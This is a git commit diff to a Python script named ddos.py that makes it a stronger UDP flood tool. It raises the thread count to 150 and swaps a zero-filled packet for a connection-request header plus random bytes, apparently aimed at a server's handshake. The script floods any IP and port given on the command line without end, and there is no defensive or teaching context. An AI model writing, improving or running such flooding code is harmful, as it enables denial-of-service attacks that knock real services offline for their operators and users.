e896d544f35bc7102e023ce99b35d4bf1c32d4de
julkiton <mare24971@gmail.com>
2026-05-07 21:20:48 +0300

    ыф

--- ddos.py
+++ ddos.py
@@ -1,15 +1,18 @@
 import socket
 import sys
-import time
 import threading
+import os
 
-def attack(ip, port):
+CONNECTION_REQUEST = b"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xffconnect"
+
+def power_attack(ip, port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    payload = b"\x00" * 80 
+    stress_payload = CONNECTION_REQUEST + os.urandom(64)
     
     while True:
         try:
-            sock.sendto(payload, (ip, port))
+            sock.sendto(stress_payload, (ip, port))
+            sock.sendto(b"\x00" * 20, (ip, port))
         except:
             pass
 
@@ -20,10 +23,13 @@ if __name__ == "__main__":
     target_ip = sys.argv[1]
     target_port = int(sys.argv[2])
 
-    for _ in range(100):
-        t = threading.Thread(target=attack, args=(target_ip, target_port))
+    print(f"[*] Node capacity maximized. Starting power-stress...")
+
+    for _ in range(150):
+        t = threading.Thread(target=power_attack, args=(target_ip, target_port))
         t.daemon = True
         t.start()
     
     while True:
+        import time
         time.sleep(10)
